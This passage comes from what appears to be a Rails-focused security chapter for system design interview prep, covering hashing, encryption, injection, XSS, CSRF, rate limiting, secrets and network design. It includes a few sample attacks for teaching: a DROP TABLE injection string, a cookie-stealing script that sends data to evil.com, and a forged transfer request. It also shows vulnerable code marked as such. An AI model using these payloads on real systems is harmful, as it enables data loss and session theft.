BCrypt::Password.new(password_hash) == 'MySecret123'  # => true
BCrypt::Password.new(password_hash) == 'WrongPass'    # => false

# HMAC — for message authentication (API signatures)
require 'openssl'

hmac = OpenSSL::HMAC.hexdigest('SHA256', 'secret_key', 'message')
# Used for: API request signing, webhook verification, CSRF tokens
```

**When to Use What:**

| Need | Use | NOT |
|------|-----|-----|
| Store passwords | bcrypt / Argon2 (slow, salted) | SHA-256 (too fast), MD5 (broken) |
| Verify file integrity | SHA-256 | MD5 (collision attacks) |
| Digital signatures | SHA-256 (with RSA/ECDSA) | — |
| API request signing | HMAC-SHA256 | — |
| Hash table keys | MurmurHash, xxHash | SHA-256 (overkill, slow) |

---

### Encryption at Rest vs in Transit

**Encryption at Rest:**
Protects data stored on disk.

| Where | How | Ruby Context |
|-------|-----|-------------|
| **Database** | Transparent Data Encryption (TDE) | RDS encryption, `ActiveRecord::Encryption` |
| **Object storage** | Server-side encryption | S3 SSE-S3, SSE-KMS via `aws-sdk-s3` |
| **Block storage** | Volume encryption | EBS encryption |
| **Application** | Application-level encryption | `lockbox` gem, `attr_encrypted` gem |

**Encryption in Transit:**
Protects data traveling over the network.

| Where | How | Ruby Context |
|-------|-----|-------------|
| **Client to server** | TLS/HTTPS | Nginx/Puma TLS termination |
| **Service to service** | mTLS | Istio service mesh, `net/http` with SSL |
| **Database connections** | TLS | `sslmode: 'require'` in `database.yml` |
| **Redis connections** | TLS | `rediss://` URL scheme in `redis-rb` |

```ruby
# Enforce TLS for database connections (config/database.yml)
# production:
#   adapter: postgresql
#   url: <%= ENV['DATABASE_URL'] %>
#   sslmode: require
#   sslrootcert: config/rds-combined-ca-bundle.pem

# Enforce TLS for Redis
# config/initializers/redis.rb
Redis.new(url: ENV['REDIS_TLS_URL'])  # rediss://... (note double 's')

# S3 encryption (server-side)
s3 = Aws::S3::Client.new
s3.put_object(
  bucket: 'my-bucket',
  key: 'sensitive/data.json',
  body: data.to_json,
  server_side_encryption: 'aws:kms',  # SSE-KMS
  ssekms_key_id: ENV['KMS_KEY_ID']
)

# Force HTTPS in Rails
# config/environments/production.rb
config.force_ssl = true  # Redirects HTTP → HTTPS, sets HSTS header
```

**Key Point:** Enable **both** encryption at rest AND in transit. They protect against different threats.

---

### Certificate Management

| Tool | Description |
|------|-------------|
| **Let's Encrypt** | Free, automated TLS certificates (90-day validity, auto-renewal) |
| **AWS Certificate Manager (ACM)** | Free TLS certificates for AWS services (ALB, CloudFront, API Gateway) |
| **HashiCorp Vault** | Secrets management + PKI (issue and manage internal certificates) |
| **cert-manager** | Kubernetes-native certificate management (auto-renewal with Let's Encrypt) |

---


## 29.4 Common Security Concerns in System Design

> In system design interviews, mentioning security concerns and their mitigations demonstrates real-world awareness. These are the most common attacks and defenses you should know.

---

### Attack Types and Defenses

**SQL Injection:**

```
❌ Vulnerable:
  query = "SELECT * FROM users WHERE email = '#{user_input}'"
  
  User input: "'; DROP TABLE users; --"
  Resulting query: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
  → Deletes the entire users table!

✅ Safe (parameterized query / ActiveRecord):
  User.where(email: user_input)
  → ActiveRecord parameterizes automatically — user input is NEVER interpolated into SQL
```

> **Ruby Context:** Rails/ActiveRecord prevents SQL injection by default through parameterized queries. However, raw SQL and certain ActiveRecord methods can still be vulnerable if misused.

```ruby
# ✅ Safe — ActiveRecord parameterizes automatically
User.where(email: params[:email])
User.where('email = ?', params[:email])
User.where('email = :email', email: params[:email])
User.find_by(email: params[:email])

# ❌ DANGEROUS — string interpolation in SQL
User.where("email = '#{params[:email]}'")  # SQL INJECTION!
User.order(params[:sort])                   # Can inject arbitrary SQL
User.select(params[:fields])                # Can inject arbitrary SQL

# ✅ Safe alternatives for dynamic SQL
User.order(Arel.sql(params[:sort])) if %w[name email created_at].include?(params[:sort])
User.select(:id, :name, :email)  # Whitelist columns

# Brakeman gem — static analysis for Rails security vulnerabilities
# Gemfile: gem 'brakeman', require: false
# Run: bundle exec brakeman
# Detects SQL injection, XSS, CSRF, and other vulnerabilities
```

---

**XSS (Cross-Site Scripting):**

```
❌ Vulnerable:
  <div>Welcome, <%= user.name %>!</div>  (in older Rails or with raw)
  
  User sets name to: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

✅ Safe (Rails auto-escapes by default):
  <div>Welcome, <%= user.name %>!</div>
  → Rails ERB auto-escapes: &lt;script&gt; rendered as text, not executed
```

> **Ruby Context:** Rails auto-escapes all output in ERB templates by default (since Rails 3). The main risk is using `raw`, `html_safe`, or `sanitize` incorrectly.

```ruby
# ✅ Safe — Rails auto-escapes by default
<%= user.name %>  # Auto-escaped: <script> becomes &lt;script&gt;
<%= user.bio %>   # Auto-escaped

# ❌ DANGEROUS — bypassing auto-escaping
<%= raw user.bio %>           # Renders HTML as-is — XSS risk!
<%= user.bio.html_safe %>     # Same — marks string as safe, skips escaping

# ✅ Safe — when you need to render HTML, use sanitize
<%= sanitize user.bio, tags: %w[p br strong em a], attributes: %w[href] %>
# Only allows whitelisted tags and attributes

# Content Security Policy (CSP) — Rails 5.2+
# config/initializers/content_security_policy.rb
Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :self
    policy.script_src  :self, :https
    policy.style_src   :self, :unsafe_inline  # Needed for inline styles
    policy.img_src     :self, :https, :data
    policy.font_src    :self, :https
    policy.connect_src :self, :https
    policy.frame_src   :none
    policy.object_src  :none
  end
  config.content_security_policy_nonce_generator = ->(request) { SecureRandom.base64(16) }
end
```

---

**CSRF (Cross-Site Request Forgery):**

```
Attack:
  1. User is logged into bank.com (has session cookie)
  2. User visits evil.com
  3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=10000">
  4. Browser automatically sends bank.com cookies with the request
  5. Bank processes the transfer!
```

> **Ruby Context:** Rails has built-in CSRF protection via `protect_from_forgery`. It's enabled by default in `ApplicationController`. For APIs using JWT (not cookies), CSRF protection is not needed.

```ruby
# Rails CSRF protection (enabled by default)
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception  # Default in Rails
  # Adds authenticity_token to all forms
  # Verifies token on POST/PUT/PATCH/DELETE requests
end

# In forms (auto-included by Rails form helpers):
<%= form_with(model: @user) do |f| %>
  <!-- Rails automatically includes: -->
  <!-- <input type="hidden" name="authenticity_token" value="random_token_here"> -->
  <%= f.text_field :name %>
  <%= f.submit %>
<% end %>

# For API controllers (JWT-based, no cookies → no CSRF needed)
class Api::BaseController < ActionController::API
  # No protect_from_forgery — API uses JWT in Authorization header, not cookies
end

# SameSite cookie attribute (Rails 6.1+)
# config/initializers/session_store.rb
Rails.application.config.session_store :cookie_store,
  key: '_myapp_session',
  same_site: :lax,    # Prevents CSRF for cross-site requests
  secure: true,        # Only sent over HTTPS
  httponly: true        # Not accessible via JavaScript
```

---

**DDoS Protection:**

| Layer | Defense | Tools |
|-------|---------|-------|
| **Network (L3/L4)** | Traffic scrubbing, rate limiting, blackholing | AWS Shield, Cloudflare, Akamai |
| **Application (L7)** | Rate limiting, CAPTCHA, bot detection | Cloudflare WAF, AWS WAF |
| **Infrastructure** | Auto-scaling, CDN absorption, geographic distribution | CloudFront, ALB auto-scaling |
| **Architecture** | Anycast, circuit breakers | Cloudflare Anycast |

---

**Rate Limiting:**

> **Ruby Context:** **Rack::Attack** is the standard rate limiting gem for Rails. It provides throttling, blocklisting, and safelisting at the Rack middleware level.

```ruby
# Rack::Attack rate limiting (config/initializers/rack_attack.rb)
class Rack::Attack
  # Throttle login attempts: 5 per minute per IP
  throttle('login/ip', limit: 5, period: 60) do |req|
    req.ip if req.path == '/users/sign_in' && req.post?
  end

  # Throttle API requests: 100 per minute per API key
  throttle('api/key', limit: 100, period: 60) do |req|
    req.env['HTTP_X_API_KEY'] if req.path.start_with?('/api/')
  end

  # Throttle password reset: 3 per hour per email
  throttle('password_reset/email', limit: 3, period: 1.hour) do |req|
    if req.path == '/users/password' && req.post?
      req.params.dig('user', 'email')&.downcase
    end
  end

  # Block known bad IPs
  blocklist('block-bad-ips') do |req|
    Rack::Attack::Fail2Ban.filter("login-#{req.ip}", maxretry: 10, findtime: 1.minute, bantime: 1.hour) do
      req.path == '/users/sign_in' && req.post?
    end
  end

  # Custom throttle response
  self.throttled_responder = ->(req) {
    retry_after = (req.env['rack.attack.match_data'] || {})[:period]
    [429, { 'Content-Type' => 'application/json', 'Retry-After' => retry_after.to_s },
     [{ error: 'Rate limit exceeded', retry_after: retry_after }.to_json]]
  }
end
```

---

**Input Validation:**

> **Ruby Context:** Rails provides strong parameters for mass assignment protection and ActiveModel validations for data validation. Always validate on the server side.

```ruby
# Strong Parameters — whitelist allowed attributes
class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    # ...
  end

  private

  def user_params
    params.require(:user).permit(:name, :email, :age)
    # Only :name, :email, :age are allowed — everything else is filtered out
    # Prevents mass assignment attacks (e.g., setting role: 'admin')
  end
end

# ActiveModel Validations
class User < ApplicationRecord
  validates :email, presence: true,
                    uniqueness: { case_sensitive: false },
                    format: { with: URI::MailTo::EMAIL_REGEXP }
  validates :name, presence: true, length: { maximum: 100 }
  validates :age, numericality: { greater_than: 0, less_than: 150 }, allow_nil: true
  validates :role, inclusion: { in: %w[viewer editor admin] }
  validates :website, format: { with: /\Ahttps?:\/\// }, allow_blank: true
end
```

---

### Secrets Management

**Never hardcode secrets** in source code, configuration files, or environment variables in plain text.

> **Ruby Context:** Rails provides `credentials` (encrypted secrets) built in. For production, use AWS Secrets Manager, Vault, or similar. The `dotenv` gem is for development only — never commit `.env` files.

```ruby
# Rails Credentials (built-in encrypted secrets)
# Edit: EDITOR=vim bin/rails credentials:edit
# Stored in: config/credentials.yml.enc (encrypted, safe to commit)
# Key in: config/master.key (NEVER commit this)

# config/credentials.yml.enc (decrypted view):
# aws:
#   access_key_id: AKIA...
#   secret_access_key: wJalr...
# stripe:
#   secret_key: sk_live_...
# database:
#   password: SuperSecret123

# Access in code:
Rails.application.credentials.aws[:access_key_id]
Rails.application.credentials.stripe[:secret_key]

# Per-environment credentials (Rails 6+)
# config/credentials/production.yml.enc
# config/credentials/production.key
Rails.application.credentials.database[:password]

# AWS Secrets Manager (aws-sdk-secretsmanager gem)
require 'aws-sdk-secretsmanager'

client = Aws::SecretsManager::Client.new(region: 'us-east-1')
secret = client.get_secret_value(secret_id: 'production/database/password')
db_password = JSON.parse(secret.secret_string)['password']

# HashiCorp Vault (vault gem)
require 'vault'

Vault.address = ENV['VAULT_ADDR']
Vault.token = ENV['VAULT_TOKEN']
secret = Vault.logical.read('secret/data/database')
db_password = secret.data[:data][:password]
```

**Secrets Best Practices:**
- **Rotate secrets regularly** — automate rotation (Vault, AWS Secrets Manager support auto-rotation)
- **Least privilege** — each service gets only the secrets it needs
- **Audit access** — log who accessed which secrets and when
- **Never log secrets** — use `Rails.application.config.filter_parameters += [:password, :secret, :token]`
- **Short-lived credentials** — use temporary tokens (AWS STS, Vault dynamic secrets)
- **Encrypt at rest** — secrets manager should encrypt stored secrets with a master key (KMS)

```ruby
# Filter sensitive parameters from logs (config/initializers/filter_parameter_logging.rb)
Rails.application.config.filter_parameters += [
  :password, :password_confirmation, :secret, :token, :_key,
  :ssn, :credit_card, :api_key, :access_token, :refresh_token
]
# Logs will show: Parameters: {"email"=>"alice@example.com", "password"=>"[FILTERED]"}
```

---


## 29.5 Network Security

> Network security controls **who can communicate with whom** and **how**. In cloud environments, network security is implemented through VPCs, security groups, firewalls, and network segmentation. A well-designed network architecture is the first line of defense against unauthorized access.

---

### VPC, Subnets (Public, Private)

A **VPC (Virtual Private Cloud)** is an isolated virtual network within a cloud provider. You control the IP address range, subnets, routing, and security.

```
VPC Architecture:

  +------------------------------------------------------------------+
  |  VPC: 10.0.0.0/16 (65,536 IPs)                                  |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Public Subnet             |  | Public Subnet             |    |
  |  | 10.0.1.0/24 (AZ-a)       |  | 10.0.2.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [ALB] [NAT Gateway]       |  | [ALB] [NAT Gateway]       |    |
  |  | [Bastion Host]            |  |                           |    |
  |  +---------------------------+  +---------------------------+    |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Private Subnet (App)      |  | Private Subnet (App)      |    |
  |  | 10.0.3.0/24 (AZ-a)       |  | 10.0.4.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [Puma/Rails App 1]        |  | [Puma/Rails App 2]        |    |
  |  | [Sidekiq Worker 1]        |  | [Sidekiq Worker 2]        |    |
  |  +---------------------------+  +---------------------------+    |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Private Subnet (Data)     |  | Private Subnet (Data)     |    |
  |  | 10.0.5.0/24 (AZ-a)       |  | 10.0.6.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [RDS PostgreSQL Primary]  |  | [RDS PostgreSQL Replica]  |    |
  |  | [ElastiCache Redis]       |  | [ElastiCache Redis]       |    |
  |  +---------------------------+  +---------------------------+    |
  +------------------------------------------------------------------+
```

**Public vs Private Subnets:**

| Feature | Public Subnet | Private Subnet |
|---------|-------------|---------------|
| **Internet access** | Direct (Internet Gateway) | Outbound only (via NAT Gateway) |
| **Public IP** | Resources can have public IPs | No public IPs |
| **Inbound from internet** | Yes (through ALB, security groups) | No (not directly reachable) |
| **What goes here** | Load balancers, NAT gateways, bastion hosts | App servers (Puma), workers (Sidekiq), databases, caches |
| **Security** | More exposed | More protected |

**Key Principle:** Put only what MUST be internet-facing in public subnets (load balancers). Everything else goes in private subnets.

> **Ruby Context:** A typical Rails production deployment: ALB in public subnet → Puma app servers in private subnet → RDS PostgreSQL and ElastiCache Redis in private data subnet. Sidekiq workers also run in the private app subnet. The Rails app connects to the database and Redis via private IPs — no internet exposure.

---

### Firewalls and Security Groups

**Security Groups (AWS):**
Virtual firewalls that control inbound and outbound traffic at the instance level.

```
Security Group: "rails-app-servers"
  Inbound Rules:
    Allow TCP 3000 from sg-alb (ALB security group only)
    Allow TCP 22 from sg-bastion (SSH from bastion only)
  
  Outbound Rules:
    Allow TCP 5432 to sg-database (PostgreSQL)
    Allow TCP 6379 to sg-redis (Redis)
    Allow TCP 443 to 0.0.0.0/0 (HTTPS to external APIs — Stripe, SendGrid, etc.)

Security Group: "database"
  Inbound Rules:
    Allow TCP 5432 from sg-rails-app-servers (only from app servers)
    Allow TCP 5432 from sg-bastion (for admin access)
  
  Outbound Rules:
    (none needed — databases don't initiate outbound connections)

Security Group: "redis"
  Inbound Rules:
    Allow TCP 6379 from sg-rails-app-servers
    Allow TCP 6379 from sg-sidekiq-workers
```

**Security Group Best Practices:**
- **Least privilege** — only allow the minimum required ports and sources
- **Reference security groups** — use SG references instead of IP ranges
- **No 0.0.0.0/0 for SSH** — restrict SSH to bastion host or VPN only
- **Separate SGs per tier** — web, app, database each have their own security group
- **Deny by default** — security groups deny all traffic unless explicitly allowed

---

### VPN and Bastion Host

**Bastion Host (Jump Box):**

```
Developer → SSH → Bastion Host (public subnet) → SSH → Rails App Server (private subnet)
                                                 → psql → RDS PostgreSQL (private subnet)
                                                 → redis-cli → ElastiCache (private subnet)
```

**VPN (Virtual Private Network):**

```
Developer → VPN Client → Encrypted Tunnel → VPC → Private Subnet → Rails Console
                                                                   → psql
                                                                   → redis-cli
```

| Feature | Bastion Host | VPN |
|---------|-------------|-----|
| Setup | Simple (one EC2 instance) | More complex (VPN server/service) |
| Access | SSH/RDP only | Full network access |
| Security | Good (single entry point) | Good (encrypted tunnel) |
| User experience | Must SSH hop through bastion | Direct access (feels like local network) |
| Cost | Low (one small instance) | Moderate (VPN service/instance) |
| Best for | Small teams, occasional access | Larger teams, frequent access |

> **Ruby Context:** For Rails console access in production, developers typically SSH through a bastion host to an app server and run `bundle exec rails console`. With AWS SSM Session Manager, you can skip the bastion entirely — connect directly to private instances without SSH keys.

---

### WAF (Web Application Firewall)

A **WAF** inspects HTTP/HTTPS traffic and blocks malicious requests based on rules.

```
Internet → WAF → ALB → Puma (Rails)

WAF inspects:
  - Request URL, headers, body
  - Blocks SQL injection patterns
  - Blocks XSS patterns
  - Blocks known bad IPs/bots
  - Rate limits by IP/path
  - Geo-blocks (block traffic from specific countries)
```

**WAF Providers:**
- **AWS WAF** — integrates with ALB, CloudFront, API Gateway
- **Cloudflare WAF** — edge-based, easy setup
- **Akamai Kona** — enterprise WAF
- **ModSecurity** — open-source WAF (with Nginx/Apache)

> **Ruby Context:** WAF operates at the infrastructure level (before requests reach Rails), so no Ruby code changes are needed. However, **Rack::Attack** provides application-level protection that complements a WAF — it handles rate limiting, IP blocking, and request throttling within the Rails process.

---

### Zero Trust Architecture

**Zero Trust** is a security model that assumes **no implicit trust** — every request must be authenticated and authorized, regardless of where it comes from.

```
Traditional (Castle-and-Moat):
  Outside the firewall → untrusted → must authenticate
  Inside the firewall → trusted → free access to everything
  Problem: if an attacker gets inside, they have access to everything!

Zero Trust:
  Every request → must authenticate + authorize → regardless of network location
  Inside the network ≠ trusted
  Every service verifies every request
```

**Zero Trust Principles:**

| Principle | Description | Implementation |
|-----------|-------------|---------------|
| **Verify explicitly** | Always authenticate and authorize based on all available data | mTLS between services, JWT validation on every request |
| **Least privilege** | Grant minimum access needed for the task | RBAC/ABAC, short-lived credentials, just-in-time access |
| **Assume breach** | Design as if the attacker is already inside | Micro-segmentation, encrypt all traffic (even internal), monitor everything |

**Zero Trust Implementation:**

| Layer | Traditional | Zero Trust |
|-------|-----------|-----------|
| **Network** | Flat internal network, firewall at perimeter | Micro-segmented; each service has its own security group |
| **Service communication** | Plain HTTP internally | mTLS everywhere (service mesh — Istio, Linkerd) |
| **Authentication** | Perimeter only (VPN/firewall) | Every service authenticates every request (JWT, mTLS) |
| **Authorization** | Network-based (if you can reach it, you can use it) | Policy-based (OPA, Pundit) — checked on every request |
| **Secrets** | Long-lived credentials | Short-lived, auto-rotated (Vault dynamic secrets) |
| **Monitoring** | Perimeter logs | Full observability — every request logged and traced |

> **Ruby Context:** For Ruby microservices, zero trust means: every service validates JWT tokens on every request (not just the API gateway), service-to-service calls use mTLS (via Istio/Linkerd), database credentials are short-lived (Vault dynamic secrets), and all internal traffic is encrypted. Rails' `force_ssl` and Faraday with TLS verification are the application-level building blocks.

---

## Summary & Key Takeaways

| Topic | Key Point |
|-------|-----------|
| Password Storage | Never plaintext; use bcrypt or Argon2 (slow, salted hashes) |
| MFA | TOTP (authenticator app) or FIDO2 (hardware key) — avoid SMS |
| OAuth 2.0 | Authorization framework; Authorization Code + PKCE for modern apps |
| OIDC | Authentication layer on OAuth 2.0; provides ID tokens (JWT) with user identity |
| JWT | Header.Payload.Signature; stateless; verify with public key; short-lived + refresh token |
| Session vs Token | Sessions for traditional web (easy revocation); JWT for APIs/mobile (stateless) |
| RBAC | Roles → permissions → users; simple, good for most apps |
| ABAC | Attribute-based policies; flexible but complex; for compliance-heavy systems |
| Zanzibar | Relationship-based access control; Google-scale; SpiceDB is open-source |
| Symmetric Encryption | AES-256-GCM; same key for encrypt/decrypt; fast; for data encryption |
| Asymmetric Encryption | RSA/ECC; public key encrypts, private key decrypts; for key exchange, signatures |
| Hashing | One-way; SHA-256 for integrity; bcrypt/Argon2 for passwords; never reversible |
| Encryption at Rest | TDE, S3 SSE, EBS encryption, ActiveRecord::Encryption — protect stored data |
| Encryption in Transit | TLS/HTTPS for client-server; mTLS for service-to-service |
| SQL Injection | Use parameterized queries (ActiveRecord does this by default) — NEVER interpolate |
| XSS | Rails auto-escapes by default; never use `raw`/`html_safe` with user input; use CSP |
| CSRF | Rails `protect_from_forgery` (built-in); SameSite cookies |
| DDoS | CDN absorption, rate limiting (Rack::Attack), auto-scaling, WAF |
| Secrets Management | Rails credentials, Vault, AWS Secrets Manager; never hardcode; rotate regularly |
| VPC | Public subnets (ALB, NAT) + private subnets (Puma, Sidekiq, RDS); least privilege |
| Security Groups | Instance-level firewall; allow only required ports and sources |
| WAF | Inspects HTTP traffic; blocks SQL injection, XSS, bots, geo-blocks |
| Zero Trust | No implicit trust; mTLS everywhere; verify every request; assume breach |

**Ruby-Specific Takeaways:**

| Area | Ruby Tools & Gems |
|------|-------------------|
| **Authentication** | Devise, has_secure_password, bcrypt-ruby, argon2 |
| **OAuth/OIDC** | OmniAuth (consumer), Doorkeeper (provider) |
| **SAML** | omniauth-saml, ruby-saml |
| **MFA/TOTP** | devise-two-factor, rotp, webauthn |
| **JWT** | jwt gem, devise-jwt |
| **Authorization (RBAC)** | Pundit, CanCanCan |
| **Authorization (ABAC)** | Pundit (custom policies), ActionPolicy |
| **Encryption (field-level)** | ActiveRecord::Encryption (Rails 7+), lockbox, attr_encrypted |
| **Encryption (low-level)** | OpenSSL (stdlib) |
| **Rate Limiting** | Rack::Attack |
| **CSRF Protection** | protect_from_forgery (built-in Rails) |
| **XSS Prevention** | Auto-escaping (built-in ERB), Content Security Policy |
| **SQL Injection Prevention** | ActiveRecord parameterized queries (built-in) |
| **Security Scanning** | Brakeman (static analysis), bundler-audit (dependency vulnerabilities) |
| **Secrets** | Rails credentials, vault gem, aws-sdk-secretsmanager |
| **Parameter Filtering** | Strong Parameters (built-in Rails) |

---

## Interview Tips for Module 29

1. **Authentication flow** — draw the OAuth 2.0 Authorization Code flow; explain each step; reference OmniAuth for Rails implementation
2. **JWT** — explain the structure (header.payload.signature); explain verification; mention short-lived + refresh token pattern; show the `jwt` gem usage
3. **Session vs JWT** — know the trade-offs; recommend the hybrid approach; mention Rails sessions (Redis-backed) for web, JWT for API
4. **Password storage** — explain why bcrypt/Argon2 (slow hashing); never SHA-256 for passwords; reference Devise's bcrypt default
5. **RBAC vs ABAC** — explain both with examples; RBAC for most apps (Pundit/CanCanCan), ABAC for complex rules (Pundit custom policies)
6. **Encryption** — explain symmetric (AES for data) vs asymmetric (RSA for key exchange); mention Rails `ActiveRecord::Encryption` and `lockbox` gem
7. **Encryption at rest + in transit** — mention both in every system design; reference `force_ssl`, database `sslmode`, Redis TLS
8. **SQL injection** — explain the attack and the fix; note that ActiveRecord prevents it by default but `where("#{}")` is still dangerous
9. **CSRF** — explain the attack; note Rails `protect_from_forgery` is built-in; SameSite cookies as modern defense
10. **XSS** — explain the attack; note Rails auto-escapes by default; warn about `raw`/`html_safe`; mention CSP headers
11. **VPC architecture** — draw public + private subnets; explain why Puma/Sidekiq/RDS go in private subnets
12. **Zero trust** — mention mTLS between services, JWT on every request, micro-segmentation; shows security maturity
13. **Secrets** — mention Rails credentials for development, Vault/AWS Secrets Manager for production; `filter_parameters` for logs